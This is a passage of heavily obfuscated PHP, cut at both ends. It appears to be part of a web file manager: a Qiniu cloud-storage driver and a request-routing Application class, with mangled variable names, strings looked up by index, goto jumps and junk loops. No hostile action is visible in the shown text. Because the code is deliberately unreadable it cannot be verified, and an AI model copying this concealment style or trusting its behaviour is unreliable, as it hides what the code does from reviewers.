\Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($òé·ôíú, $‘­ê™¡£ = '', $ó‘«¾ = REPEAT_RENAME) { if ($this->setContent($òé·ôíú, $‘­ê™¡£)) { return $this->getPathOuter($òé·ôíú); } return !1; } public function mkdir($Î¶éÃÔÌ, $ˆûª€Ù = REPEAT_SKIP) { $ÅÎ«¸­ =& $_SERVER[²Ö÷öõ]; $´³Ö¨ûˆ = trim($Î¶éÃÔÌ, $ÅÎ«¸­[8]); if ($this->_isFolder($´³Ö¨ûˆ)) { return $this->getPathOuter($´³Ö¨ûˆ); } $Î¶éÃÔÌ = $´³Ö¨ûˆ . $ÅÎ«¸­[8]; $ßéµÀñ = get_path_this($´³Ö¨ûˆ); $æƒúÖí = $Î¶éÃÔÌ . $ßéµÀñ; if (!$this->mkfile($æƒúÖí)) { return !1; } if (!$this->moveFile($æƒúÖí, $Î¶éÃÔÌ)) { $this->delFile($æƒúÖí); return !1; } return $this->getPathOuter($´³Ö¨ûˆ); } public function copyFile($Ì•ô€±, $º»ÈÁò—) { $«˜ˆÂ = $this->bucketManager->copy($this->bucket, $Ì•ô€±, $this->bucket, $º»ÈÁò—, !0); return $«˜ˆÂ ? !1 : $this->getPathOuter($º»ÈÁò—); } public function moveFile($Øğ¯æçˆ, $¡Š“òşÁ) { $´¨é›£œ = $this->bucketManager->move($this->bucket, $Øğ¯æçˆ, $this->bucket, $¡Š“òşÁ, !0); return $´¨é›£œ ? !1 : $this->getPathOuter($¡Š“òşÁ); } public function delFile($¸û›„ı®) { if (!$this->exist($¸û›„ı®)) { return !0; } $î“³ş³¦ = $this->bucketManager->delete($this->bucket, $¸û›„ı®); return $î“³ş³¦ ? !1 : !0; } public function delFolder($õÇ´Ş÷Ô) { $ƒãœş´ğ =& $_SERVER[²Ö÷öõ]; if (!$this->exist($õÇ´Ş÷Ô)) { return !0; } $this->listItemCache = !1; $™…³ÒÚ™ = $this->fileList($õÇ´Ş÷Ô); $this->listItemCache = !0; $ Ü¶ÂÌ˜ = trim($õÇ´Ş÷Ô, $ƒãœş´ğ[8]) . $ƒãœş´ğ[8]; if (!empty($õÇ´Ş÷Ô) && $õÇ´Ş÷Ô !== $ƒãœş´ğ[228] && !in_array($ Ü¶ÂÌ˜, $™…³ÒÚ™[$ƒãœş´ğ[85]])) { $™…³ÒÚ™[$ƒãœş´ğ[85]][] = $ Ü¶ÂÌ˜; } $³¼…±Šú = $this->delByBatch($™…³ÒÚ™[$ƒãœş´ğ[86]]); if (!$³¼…±Šú) { return !1; } $³¼…±Šú = $this->delByBatch($™…³ÒÚ™[$ƒãœş´ğ[85]]); if (!$³¼…±Šú) { return !1; } return $this->delFile($ Ü¶ÂÌ˜); } private function delByBatch($¸¥ÍÅÒ•) { foreach (array_chunk($¸¥ÍÅÒ•, 1000) as $ö¼îªï’) { $Á¿ñÅ¤ç = $this->bucketManager->buildBatchDelete($this->bucket, $ö¼îªï’); list($±øŞ·Ñï, $î²™€Şü) = $this->bucketManager->batch($Á¿ñÅ¤ç); if ($î²™€Şü) { return !1; } } return !0; } public function rename($ÏÇ‚¥ç®, $º‰ºÒşµ) { return $this->renameObject($ÏÇ‚¥ç®, $º‰ºÒşµ); } public function fileInfo($ùñ—Äú, $ÂŒ¨ùÄÖ = false, $ß²Ö­¡‹ = array()) { $â¿‡­ìü =& $_SERVER[²Ö÷öõ]; $Ï·á£÷› = array($â¿‡­ìü[32] => $this->pathThis($ùñ—Äú), $â¿‡­ìü[87] => $this->getPathOuter($â¿‡­ìü[8] . $ùñ—Äú), $â¿‡­ìü[33] => $â¿‡­ìü[230], $â¿‡­ìü[79] => isset($ß²Ö­¡‹[$â¿‡­ìü[1538]]) ? $ß²Ö­¡‹[$â¿‡­ìü[1538]] : 0, $â¿‡­ìü[169] => $this->ext($ùñ—Äú)); if ($ÂŒ¨ùÄÖ) { return $Ï·á£÷›; } $Ï·á£÷›[$â¿‡­ìü[231]] = $Ï·á£÷›[$â¿‡­ìü[88]] = 0; $Ï·á£÷›[$â¿‡­ìü[232]] = $Ï·á£÷›[$â¿‡­ìü[233]] = !0; if (empty($ß²Ö­¡‹)) { $ß²Ö­¡‹ = $this->objectMeta($ùñ—Äú); if (!$ß²Ö­¡‹) { return $Ï·á£÷›; } } if (isset($ß²Ö­¡‹[$â¿‡­ìü[234]]) && $ß²Ö­¡‹[$â¿‡­ìü[234]]) { $Ï·á£÷›[$â¿‡­ìü[235]] = $ß²Ö­¡‹[$â¿‡­ìü[234]]; } if (isset($ß²Ö­¡‹[$â¿‡­ìü[245]]) && $ß²Ö­¡‹[$â¿‡­ìü[245]]) { $Ï·á£÷›[$â¿‡­ìü[235]] = $ß²Ö­¡‹[$â¿‡­ìü[245]]; } if (isset($ß²Ö­¡‹[$â¿‡­ìü[1539]])) { $Ï·á£÷›[$â¿‡­ìü[88]] = substr($ß²Ö­¡‹[$â¿‡­ìü[1539]] . $â¿‡­ìü[12], 0, 10); } if (isset($ß²Ö­¡‹[$â¿‡­ìü[1538]])) { $Ï·á£÷›[$â¿‡­ìü[79]] = $ß²Ö­¡‹[$â¿‡­ìü[1538]]; } return $Ï·á£÷›; } public function folderInfo($Ú÷†êŒ, $ÅÉ÷úÍš = false) { $¸½¼±Ï• =& $_SERVER[²Ö÷öõ]; $ÅŒø¶ = array($¸½¼±Ï•[32] => $this->pathThis($Ú÷†êŒ), $¸½¼±Ï•[87] => $this->getPathOuter($¸½¼±Ï•[8] . $Ú÷†êŒ), $¸½¼±Ï•[33] => $¸½¼±Ï•[78]); if ($ÅÉ÷úÍš) { return $ÅŒø¶; } $ÅŒø¶[$¸½¼±Ï•[231]] = $ÅŒø¶[$¸½¼±Ï•[88]] = 0; $ÅŒø¶[$¸½¼±Ï•[232]] = $ÅŒø¶[$¸½¼±Ï•[233]] = !0; $Ú÷†êŒ = rtrim($Ú÷†êŒ, $¸½¼±Ï•[8]) . $¸½¼±Ï•[8]; $ïœ£Ş = $this->objectMeta($Ú÷†êŒ); if (isset($ïœ£Ş[$¸½¼±Ï•[1539]])) { $ÅŒø¶[$¸½¼±Ï•[88]] = substr($ïœ£Ş[$¸½¼±Ï•[1539]] . $¸½¼±Ï•[12], 0, 10); } return $ÅŒø¶; } public function listPath($¨½ÄØÉ³, $—ƒÃö—¬ = false) { $¿Â¦Ùë =& $_SERVER[²Ö÷öõ]; $»˜ù‹Ş¯ = $this->fileList($¨½ÄØÉ³, $¿Â¦Ùë[8], !0); foreach ($»˜ù‹Ş¯[$¿Â¦Ùë[85]] as $¿ºğåäÁ => $À«Í•Üö) { $»˜ù‹Ş¯[$¿Â¦Ùë[85]][$¿ºğåäÁ] = $this->folderInfo($À«Í•Üö, $—ƒÃö—¬); } foreach ($»˜ù‹Ş¯[$¿Â¦Ùë[86]] as $¿ºğåäÁ => $À«Í•Üö) { $»˜ù‹Ş¯[$¿Â¦Ùë[86]][$¿ºğåäÁ] = $this->fileInfo($À«Í•Üö[$¿Â¦Ùë[97]], $—ƒÃö—¬, $À«Í•Üö); } return $»˜ù‹Ş¯; } public function has($’úÜßõ÷, $’Ü¦ÖÁæ = false, $”è…Ğƒ = true) { $²šÖÑÆÚ =& $_SERVER[²Ö÷öõ]; $’úÜßõ÷ = trim($’úÜßõ÷, $²šÖÑÆÚ[8]); $ìƒ¿»¦ = empty($’úÜßõ÷) && $’úÜßõ÷ !== $²šÖÑÆÚ[228] ? $²šÖÑÆÚ[12] : $’úÜßõ÷ . $²šÖÑÆÚ[8]; $Äøû˜„Ï = $²šÖÑÆÚ[12]; $™Ÿø·´ = 500; $ˆ¼‡‡ò÷ = $²šÖÑÆÚ[8]; $ñ£‘Ó¬è = $èŞÂùƒ™ = 0; while (!0) { check_abort(); list($îãèÈ†¼, $›îİ—) = $this->bucketManager->listFiles($this->bucket, $ìƒ¿»¦, $Äøû˜„Ï, $™Ÿø·´, $ˆ¼‡‡ò÷); if ($›îİ—) { break; } $Äøû˜„Ï = array_key_exists($²šÖÑÆÚ[1484], $îãèÈ†¼) ? $Äøû˜„Ï = $îãèÈ†¼[$²šÖÑÆÚ[1540]] : $²šÖÑÆÚ[12]; if ($’Ü¦ÖÁæ) { if (!empty($îãèÈ†¼[$²šÖÑÆÚ[1541]])) { $ñ£‘Ó¬è += count($îãèÈ†¼[$²šÖÑÆÚ[1541]]); } if (!empty($îãèÈ†¼[$²šÖÑÆÚ[1542]])) { $èŞÂùƒ™ += count($îãèÈ†¼[$²šÖÑÆÚ[1542]]); } if ($Äøû˜„Ï === $²šÖÑÆÚ[12]) { break; } continue; } if ($”è…Ğƒ) { if (!empty($îãèÈ†¼[$²šÖÑÆÚ[1541]])) { return !0; } } else { if (!empty($îãèÈ†¼[$²šÖÑÆÚ[1542]])) { return !0; } } if ($Äøû˜„Ï === $²šÖÑÆÚ[12]) { break; } } if ($’Ü¦ÖÁæ) { return array($²šÖÑÆÚ[239] => $ñ£‘Ó¬è, $²šÖÑÆÚ[240] => $èŞÂùƒ™); } return !1; } public function listAll($…ˆá÷¢İ) { $—³½Ù—ã =& $_SERVER[²Ö÷öõ]; $Éì¥›°Ô = $this->fileList($…ˆá÷¢İ, $—³½Ù—ã[12], !0); $†òÎôÀš = array_to_keyvalue($Éì¥›°Ô[$—³½Ù—ã[86]], $—³½Ù—ã[32]); foreach ($Éì¥›°Ô[$—³½Ù—ã[85]] as $­Ò†ÉË) { if (is_string($­Ò†ÉË)) { $†òÎôÀš[$­Ò†ÉË] = array($—³½Ù—ã[79] => 0); } } return $this->listAllFiles($…ˆá÷¢İ, $†òÎôÀš); } private function fileList($„±ç¯ê, $Ë™ùĞü§ = '', $²ê²Æ¤Ë = 0) { $ĞºÊñåÁ =& $_SERVER[²Ö÷öõ]; $„±ç¯ê = trim($„±ç¯ê, $ĞºÊñåÁ[8]); $İãíÏò = empty($„±ç¯ê) && $„±ç¯ê !== $ĞºÊñåÁ[228] ? $ĞºÊñåÁ[12] : $„±ç¯ê . $ĞºÊñåÁ[8]; $şí…‚Ôù = $ĞºÊñåÁ[12]; $á—ê½«û = 1000; $á”ìÒòä = $¤ˆ¡¶¯ = array(); while (!0) { check_abort(); list($•šˆÉ¼², $®É©É£) = $this->bucketManager->listFiles($this->bucket, $İãíÏò, $şí…‚Ôù, $á—ê½«û, $Ë™ùĞü§); if ($®É©É£) { break; } $şí…‚Ôù = array_key_exists($ĞºÊñåÁ[1484], $•šˆÉ¼²) ? $şí…‚Ôù = $•šˆÉ¼²[$ĞºÊñåÁ[1540]] : $ĞºÊñåÁ[12]; $ˆöş¸Äú = isset($•šˆÉ¼²[$ĞºÊñåÁ[1541]]) ? $•šˆÉ¼²[$ĞºÊñåÁ[1541]] : array(); $°ÛœÅ˜² = isset($•šˆÉ¼²[$ĞºÊñåÁ[1542]]) ? $•šˆÉ¼²[$ĞºÊñåÁ[1542]] : array(); foreach ($ˆöş¸Äú as $ş’‰ñ) { if ($ş’‰ñ[$ĞºÊñåÁ[97]] == $İãíÏò) { continue; } $¤™¿šÑ¡ = $ş’‰ñ[$ĞºÊñåÁ[97]]; $ ×£¥Š¹ = $ş’‰ñ[$ĞºÊñåÁ[1538]]; $ş’‰ñ[$ĞºÊñåÁ[79]] = $ ×£¥Š¹; $•Ê÷¨‘ = $ ×£¥Š¹ == 0 && substr($¤™¿šÑ¡, strlen($¤™¿šÑ¡) - 1, 1) == $ĞºÊñåÁ[8] ? !0 : !1; $this->cacheMethodInfoSet($¤™¿šÑ¡, $•Ê÷¨‘, $ş’‰ñ); if ($•Ê÷¨‘) { $á”ìÒòä[] = $¤™¿šÑ¡; continue; } $¤ˆ¡¶¯[] = $²ê²Æ¤Ë ? $ş’‰ñ : $¤™¿šÑ¡; } foreach ($°ÛœÅ˜² as $¤™¿šÑ¡) { if ($¤™¿šÑ¡ == $İãíÏò) { continue; } $á”ìÒòä[] = $¤™¿šÑ¡; $this->cacheMethodInfoSet($¤™¿šÑ¡, !0); } if ($şí…‚Ôù === $ĞºÊñåÁ[12]) { break; } } $this->cacheMethodInfoSet($„±ç¯ê, !0); return array($ĞºÊñåÁ[85] => $á”ìÒòä, $ĞºÊñåÁ[86] => $¤ˆ¡¶¯); } public function canRead($—ş·šçÜ) { return $this->exist($—ş·šçÜ) ? !0 : !1; } public function canWrite($ã‡—Ğé¸) { return $this->exist($ã‡—Ğé¸) ? !0 : !1; } public function getContent($±š‘Şú’) { return $this->fileSubstr($±š‘Şú’, 0, -1); } public function setContent($ßüÖ’Œ, $•ø€õ˜ = '') { $Ïşß«ó = $this->tempFile($this->pathThis($ßüÖ’Œ)); file_put_contents($Ïşß«ó, $•ø€õ˜); if ($this->upload($ßüÖ’Œ, $Ïşß«ó)) { $this->tempFileRemve($Ïşß«ó); return !0; } return !1; } public function refreshUrls($ªõÏ·») { $Ø£ ¡À¢ =& $_SERVER[²Ö÷öõ]; $ÔÁÚû‹› = array(); if (is_array($ªõÏ·»)) { foreach ($ªõÏ·» as $êë‡¨°ë) { $ÔÁÚû‹›[] = $this->link($êë‡¨°ë); } } else { $ÔÁÚû‹›[] = $this->link($ªõÏ·»); } $¸ùëİ°È = new Qiniu\Cdn\CdnManager($this->auth); list($¥×«óˆ”, $¼øà‡éÚ) = $¸ùëİ°È->refreshUrls($ÔÁÚû‹›); if ($¼øà‡éÚ) { return !1; } return $¥×«óˆ”[$Ø£ ¡À¢[1272]] == $Ø£ ¡À¢[842] ? !0 : !1; } public function fileSubstr($ò×Ñë¿ç, $í ô–¯•, $­Øú°ï¥) { $©—’ğö¾ =& $_SERVER[²Ö÷öõ]; if (!($‹ı­îú¸ = $this->link($ò×Ñë¿ç))) { return !1; } $ıÇšùêŒ = !1; if ($­Øú°ï¥ > 0) { $­Îºµäş = $í ô–¯• + $­Øú°ï¥ - 1; $ıÇšùêŒ = array($©—’ğö¾[1543] . $í ô–¯• . $©—’ğö¾[462] . $­Îºµäş); } $‡ˆ‹«Ö = url_request($‹ı­îú¸, $©—’ğö¾[261], !1, $ıÇšùêŒ); return $‡ˆ‹«Ö[$©—’ğö¾[833]] ? $‡ˆ‹«Ö[$©—’ğö¾[1295]] : !1; } public function upload($’‰¯ê´ñ, $¯Ô—×øï, $ÓØôÑ²­ = false, $òúÄ§‡ = REPEAT_REPLACE) { $Ôú—ÇÂŞ = new Qiniu\Storage\UploadManager(); $Óû¯‡Ö = $this->auth->uploadToken($this->bucket, $’‰¯ê´ñ); $Äœ½äÇ = get_file_mime(get_path_ext($¯Ô—×øï)); list($‰õ®Ã·, $â±È¢©Ø) = $Ôú—ÇÂŞ->putFile($Óû¯‡Ö, $’‰¯ê´ñ, $¯Ô—×øï, null, $Äœ½äÇ); return $â±È¢©Ø ? !1 : $this->getPathOuter($’‰¯ê´ñ); } public function uploadFormData($ŠÛğÏ¡Ë, $¾‘£ÆÉ = 3600) { return $this->uploadToken($ŠÛğÏ¡Ë, $¾‘£ÆÉ); } public function multiUploadFormData($«¶Ìèü‡, $ë…ú­‘’ = 3600) { return $this->uploadToken($«¶Ìèü‡, $ë…ú­‘’); } private function uploadToken($øàÀ­’¥, $ì²£œÊÂ = 3600) { $“˜ö‰‡÷ =& $_SERVER[²Ö÷öõ]; $ßÕ÷ÖÆ± = $ì²£œÊÂ; $üàŠİÉÓ = array($“˜ö‰‡÷[1544] => $“˜ö‰‡÷[1545]); $¾¶Ø¹¢¸ = $øàÀ­’¥; $ıäô™çŸ = $this->auth->uploadToken($this->bucket, $¾¶Ø¹¢¸, $ßÕ÷ÖÆ±, $üàŠİÉÓ, !0); $ŠÅ×¬¥› = empty($this->region) || $this->region == $“˜ö‰‡÷[1546] ? $“˜ö‰‡÷[12] : $“˜ö‰‡÷[462] . $this->region; $İãà« = http_type() . "\x3a\57\57\165\160\x6c\x6f\x61\x64{$ŠÅ×¬¥›}\56\161\151\x6e\x69\165\x70\x2e\143\x6f\x6d\57"; return array($“˜ö‰‡÷[1547] => $ıäô™çŸ, $“˜ö‰‡÷[1548] => $İãà«); } public function download($â† ÔÏ, $Ì¹Ù¼Ø) { $± ÌÅ×» = IO::getPathInner(IO::mkfile($Ì¹Ù¼Ø)); if (!($¼÷Ş‹í = $this->link($â† ÔÏ))) { return !1; } $§çÑÛãâ = 0; $†¨¨ù®À = 1024 * 200; $®£µ°ô = fopen($± ÌÅ×», $_SERVER[²Ö÷öõ][1549]); while (!0) { $æ’½”ò = $this->fileSubstr($â† ÔÏ, $§çÑÛãâ, $†¨¨ù®À); if ($æ’½”ò === !1) { return !1; } fwrite($®£µ°ô, $æ’½”ò); $§çÑÛãâ += $†¨¨ù®À; if (strlen($æ’½”ò) < $†¨¨ù®À) { break; } } fclose($®£µ°ô); return $Ì¹Ù¼Ø; } public function link($ÜŸ”š¯û, $¯Õñ¡¿‡ = '') { if (!$this->isFile($ÜŸ”š¯û)) { return !1; } $ìê¤ˆ“È = $this->getHost() . $_SERVER[²Ö÷öõ][8] . $this->pathEncode($ÜŸ”š¯û) . $¯Õñ¡¿‡; return $this->auth->privateDownloadUrl($ìê¤ˆ“È, 3600 * 12); } public function fileOut($Òû¢Û °, $ˆÁ˜ºâ² = false, $ê“ìÁÁ = false, $êÖÄ…‹Ï = '') { $éÛ á÷õ =& $_SERVER[²Ö÷öõ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Òû¢Û °, $ˆÁ˜ºâ², $ê“ìÁÁ, $êÖÄ…‹Ï); } if (!$ê“ìÁÁ) { $ê“ìÁÁ = $this->pathThis($Òû¢Û °); } $ë¥Ÿ¬çë = $ˆÁ˜ºâ² ? $éÛ á÷õ[1550] . rawurlencode($ê“ìÁÁ) : $éÛ á÷õ[12]; $ãúÏª¸è = $this->link($Òû¢Û °, $ë¥Ÿ¬çë); $this->fileOutLink($ãúÏª¸è); } public function fileOutServer($‹àÚè½, $­Şºæİí = false, $¸·µüƒ = false, $éêÂó¼ = '') { parent::fileOut($‹àÚè½, $­Şºæİí, $¸·µüƒ, $éêÂó¼); } public function fileOutImage($¤ïä€äù, $­Õñèñâ = 250) { if ($this->size($¤ïä€äù) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¤ïä€äù, $­Õñèñâ); } $÷ğ•Óš = $this->link($¤ïä€äù, $_SERVER[²Ö÷öõ][1551] . $­Õñèñâ); $this->fileOutLink($÷ğ•Óš); } public function fileOutImageServer($­Š’åê€, $šƒ¼À«û = 250) { parent::fileOutImage($­Š’åê€, $šƒ¼À«û); } public function hashMd5($¼ßŸ¥³Â) { $ÍÀÇÃØˆ =& $_SERVER[²Ö÷öõ]; $™»‚º© = $this->objectMeta($¼ßŸ¥³Â); return isset($™»‚º©[$ÍÀÇÃØˆ[245]]) ? $™»‚º©[$ÍÀÇÃØˆ[245]] : !1; $òùÌÇÇ¢ = $this->link($¼ßŸ¥³Â, $ÍÀÇÃØˆ[1552]); } public function size($÷ÒşÇìÉ) { $ÍĞ»éØ¹ = $this->objectMeta($÷ÒşÇìÉ); return $ÍĞ»éØ¹ ? $ÍĞ»éØ¹[$_SERVER[²Ö÷öõ][79]] : 0; } public function info($”„Å¶ìˆ) { if ($this->isFolder($”„Å¶ìˆ)) { return $this->folderInfo($”„Å¶ìˆ); } else { if ($this->isFile($”„Å¶ìˆ)) { return $this->fileInfo($”„Å¶ìˆ); } } return !1; } public function exist($ıöúÌœù) { return $this->isFile($ıöúÌœù) || $this->isFolder($ıöúÌœù); } public function isFile($œõĞó“ù) { return !$this->isFolder($œõĞó“ù) && $this->objectMeta($œõĞó“ù); } public function isFolder($áš‡°¬æ) { return $this->cacheMethod($_SERVER[²Ö÷öõ][179], $áš‡°¬æ); } protected function objectMeta($íß¦®ù›) { return $this->cacheMethod($_SERVER[²Ö÷öõ][181], $íß¦®ù›); } protected function _objectMeta($ÚÚ‡§ÇĞ) { $›¤¿ =& $_SERVER[²Ö÷öõ]; list($­šàŞÁ•, $ßæ»€¾) = $this->bucketManager->stat($this->bucket, $ÚÚ‡§ÇĞ); if ($­šàŞÁ•) { $­šàŞÁ•[$›¤¿[79]] = intval($­šàŞÁ•[$›¤¿[1538]]); } return $­šàŞÁ•; } protected function _isFolder($Œ”ÒÒ¤) { $øå•¾ê =& $_SERVER[²Ö÷öõ]; if ($Œ”ÒÒ¤ == $øå•¾ê[12] || $Œ”ÒÒ¤ == $øå•¾ê[8]) { return !0; } list($ƒ“í˜°Ì, $š’º÷Ûò) = $this->bucketManager->listFiles($this->bucket, trim($Œ”ÒÒ¤, $øå•¾ê[8]) . $øå•¾ê[8], $øå•¾ê[12], 1, $øå•¾ê[8]); return !empty($ƒ“í˜°Ì[$øå•¾ê[1541]]) || !empty($ƒ“í˜°Ì[$øå•¾ê[1542]]) ? !0 : !1; } } goto EÙ×¸ôá; fÄèé¦›‡±: if (!$wynxhlmpbr) { return; } class Application { private $defaultModule = "\x69\x6e\x64\145\x78"; private $defaultController = "\151\x6e\144\145\x78"; private $defaultAction = "\x69\156\144\x65\170"; function __construct() { } public function setDefault($å·Äöäû) { $“ ¢›˜À =& $_SERVER[²Ö÷öõ]; $“²„ùÕ™ =& $_SERVER[‹“¬»„ú]; $ÜŒúÎÉÁ = explode($“²„ùÕ™[0], trim($å·Äöäû, $“²„ùÕ™[0])); $øÉíÄ‘î = $“ ¢›˜À[684]; if (strlen($øÉíÄ‘î) < $“ ¢›˜À[685]) { die; } $this->defaultModule = $ÜŒúÎÉÁ[0] ? $ÜŒúÎÉÁ[0] : $this->defaultModule; $…ÕÃŒØÀ = $“ ¢›˜À[686]; if (!$…ÕÃŒØÀ) { return; } $this->defaultController = $ÜŒúÎÉÁ[1] ? $ÜŒúÎÉÁ[1] : $this->defaultController; $this->defaultAction = $ÜŒúÎÉÁ[2] ? $ÜŒúÎÉÁ[2] : $this->defaultAction; $this->ceky58178d85($“²„ùÕ™[1], array($this, $“²„ùÕ™[2])); } public function appRun($í«¤Àõ) { $§õ–„ =& $_SERVER[²Ö÷öõ]; $Á…¶˜Òˆ =& $_SERVER[‹“¬»„ú]; $×î¿³Å‹ = explode($Á…¶˜Òˆ[0], $í«¤Àõ); $¢šğ¦ª¹ = $§õ–„[687]; if (!$¢šğ¦ª¹) { die; } $º‘øêå° = strtolower($×î¿³Å‹[0]); $œµù¯ö = $Á…¶˜Òˆ[3]; if ($º‘øêå° == $Á…¶˜Òˆ[4]) { $œµù¯ö = $Á…¶˜Òˆ[5]; $×î¿³Å‹[0] = $Á…¶˜Òˆ[6]; $×î¿³Å‹[1] = $×î¿³Å‹[1] . $Á…¶˜Òˆ[7]; $í«¤Àõ = join($Á…¶˜Òˆ[0], $×î¿³Å‹); $í«¤Àõ = trim($í«¤Àõ, $Á…¶˜Òˆ[0]); } call_user_func(array($Á…¶˜Òˆ[8], $Á…¶˜Òˆ[9]), $œµù¯ö . $Á…¶˜Òˆ[10], $í«¤Àõ); ActionCall($í«¤Àõ); call_user_func(array($Á…¶˜Òˆ[8], $Á…¶˜Òˆ[9]), $œµù¯ö . $Á…¶˜Òˆ[11], $í«¤Àõ); $š…»Ô’Ô = $§õ–„[688]; if (strlen($š…»Ô’Ô) < $§õ–„[689]) { return; } } private function autorun() { $àŞòïşß =& $_SERVER[²Ö÷öõ]; $ñ¯Ø…ã =& $_SERVER[‹“¬»„ú]; global $config; $î…ãôğ = $àŞòïşß[690]; if (!$î…ãôğ) { return; } if (count($config[$ñ¯Ø…ã[12]]) == 0) { return; } foreach ($config[$ñ¯Ø…ã[12]] as $°Ú©İ => $öÇ²ŒÛ) { $this->appRun($öÇ²ŒÛ); $Ì·ŒÚ¹­ = $àŞòïşß[691]; if (!$Ì·ŒÚ¹­) { die; } } } private function xsaj19410404() { $êÊ¾ªğó =& $_SERVER[²Ö÷öõ]; $’Î¢ÍÒÑ =& $_SERVER[‹“¬»„ú]; $Ú£Ÿ‹ = $’Î¢ÍÒÑ[4]; $ôıŒÂù“ = $êÊ¾ªğó[692]; while ($ôıŒÂù“ < $êÊ¾ªğó[680]) { if ($ôıŒÂù“ >= 0) { break; } $ôıŒÂù“++; } $õÈªê„ = $GLOBALS[$’Î¢ÍÒÑ[13]][$’Î¢ÍÒÑ[14]][0]; $åª•×šæ = $êÊ¾ªğó[693]; if (strlen($åª•×šæ) < $êÊ¾ªğó[694]) { return; } if (!$õÈªê„ || strlen($õÈªê„) <= strlen($Ú£Ÿ‹)) { return; } if (strtolower(substr($õÈªê„, -strlen($Ú£Ÿ‹))) != $Ú£Ÿ‹) { return; } $£€ªø¹› = substr($õÈªê„, 0, -strlen($Ú£Ÿ‹)); $¸¬š£ü = array($’Î¢ÍÒÑ[4], $£€ªø¹›); $Ø»ªµ = array_slice($GLOBALS[$’Î¢ÍÒÑ[13]][$’Î¢ÍÒÑ[14]], 1); $ÈœæÖÀ = $êÊ¾ªğó[695]; if (!$ÈœæÖÀ) { die; } $GLOBALS[$’Î¢ÍÒÑ[13]][$’Î¢ÍÒÑ[14]] = array_merge($¸¬š£ü, $Ø»ªµ); $å‡³çÒÍ = $êÊ¾ªğó[696]; if (!$å‡³çÒÍ) { die; } $GLOBALS[$’Î¢ÍÒÑ[13]][$’Î¢ÍÒÑ[15]] = implode($’Î¢ÍÒÑ[0], $GLOBALS[$’Î¢ÍÒÑ[13]][$’Î¢ÍÒÑ[14]]); $¨ôù”«ø = $êÊ¾ªğó[697]; if (strlen($¨ôù”«ø) < $êÊ¾ªğó[685]) { return; } } private function tksp47ee5960() { $´‘ö•ê =& $_SERVER[²Ö÷öõ]; $øÑª¢Ùö =& $_SERVER[‹“¬»„ú]; if ($GLOBALS[$øÑª¢Ùö[13]][$øÑª¢Ùö[15]] != $øÑª¢Ùö[6]) { return; } $²ã¸ËÑ = $_SERVER[$øÑª¢Ùö[16]]; $“Ì´ï½‡ = $´‘ö•ê[698]; if (!$“Ì´ï½‡) { return; } $ÑÉñÊŒ = $øÑª¢Ùö[17]; if (!strstr($²ã¸ËÑ, $ÑÉñÊŒ)) { return; } $¾Ïü¥Ç× = strrpos($²ã¸ËÑ, $ÑÉñÊŒ); $ŸÂ©Ğå = $´‘ö•ê[699]; if (strlen($ŸÂ©Ğå) < $´‘ö•ê[685]) { return; } $¬ÎÌüöÊ = substr($²ã¸ËÑ, $¾Ïü¥Ç× + strlen($ÑÉñÊŒ)); $ĞüæÖ¿ô = $´‘ö•ê[700]; preg_match_all($øÑª¢Ùö[18], $¬ÎÌüöÊ, $Œ§êÇ¯ô); $³ïìÁÓ = $´‘ö•ê[701]; while ($³ïìÁÓ < $´‘ö•ê[702]) { if ($³ïìÁÓ >= 0) { break; } $³ïìÁÓ++; } $¬ÎÌüöÊ = trim($Œ§êÇ¯ô[0][0], $øÑª¢Ùö[19]); $õıŒÅÈÏ = $´‘ö•ê[703]; $GLOBALS[$øÑª¢Ùö[13]][$øÑª¢Ùö[14]] = explode($øÑª¢Ùö[19], $¬ÎÌüöÊ); $ßãËùïà = $´‘ö•ê[704]; while (strlen($ßãËùïà) < $´‘ö•ê[702]) { if (!$ßãËùïà) { break; } $ßãËùïà++; } $GLOBALS[$øÑª¢Ùö[13]][$øÑª¢Ùö[15]] = implode($øÑª¢Ùö[0], $GLOBALS[$øÑª¢Ùö[13]][$øÑª¢Ùö[14]]); $ Ø÷‘õÅ = $´‘ö•ê[705]; while (strlen($ Ø÷‘õÅ) < $´‘ö•ê[702]) { if (!$ Ø÷‘õÅ) { break; } $ Ø÷‘õÅ++; } } public function run() { $¨¼Ä‚¡¥ =& $_SERVER[²Ö÷öõ]; $¯Æ·ıö¾ =& $_SERVER[‹“¬»„ú]; $this->tksp47ee5960(); $ÏôÎŸçä = $¨¼Ä‚¡¥[706]; while ($ÏôÎŸçä < $¨¼Ä‚¡¥[694]) { if ($ÏôÎŸçä >= 0) { break; } $ÏôÎŸçä++; } $this->xsaj19410404(); $¨ˆ±Œ­ = $GLOBALS[$¯Æ·ıö¾[13]][$¯Æ·ıö¾[14]]; $ÒˆçÓìÕ = $¨¼Ä‚¡¥[707]; $“øù·´Ô = $GLOBALS[$¯Æ·ıö¾[13]][$¯Æ·ıö¾[15]]; define($¯Æ·ıö¾[20], isset($¨ˆ±Œ­[0]) && $¨ˆ±Œ­[0] ? $¨ˆ±Œ­[0] : $this->defaultModule); define($¯Æ·ıö¾[21], isset($¨ˆ±Œ­[1]) && $¨ˆ±Œ­[0] ? $¨ˆ±Œ­[1] : $this->defaultController); define($¯Æ·ıö¾[22], isset($¨ˆ±Œ­[2]) && $¨ˆ±Œ­[0] ? $¨ˆ±Œ­[2] : $this->defaultAction); $Ü£»³ş = $¨¼Ä‚¡¥[708]; if (strlen($Ü£»³ş) < $¨¼Ä‚¡¥[685]) { return; } define($¯Æ·ıö¾[23], MOD . $¯Æ·ıö¾[0] . ST . $¯Æ·ıö¾[0] . ACT); $_SERVER[$¯Æ·ıö¾[24]] = strtolower(ACTION); $this->autorun(); $µÊŞİ°º = $¨¼Ä‚¡¥[709]; if (strlen($µÊŞİ°º) < $¨¼Ä‚¡¥[689]) { return; } if (count($¨ˆ±Œ­) >= 3) { $this->appRun($“øù·´Ô); } else { $this->appRun(ACTION); } } private $glvf23f1c1a0 = array(); private $mebs2d8c048f = ''; public function wpvt0d9614ec() { $©õÁø‘Œ =& $_SERVER[²Ö÷öõ]; $ÄöÙ‹³á =& $_SERVER[‹“¬»„ú]; $this->qsmcf37e66f9(); $ĞíÍ ÔŸ = $©õÁø‘Œ[710]; $this->picde00fd580(); $Œ©•Øá = $©õÁø‘Œ[711]; if (!$Œ©•Øá) { return; } $this->cvpt763a604a(); $this->ijakccf672ce(); $ß”ğ¼ûì = $©õÁø‘Œ[712]; while ($ß”ğ¼ûì < 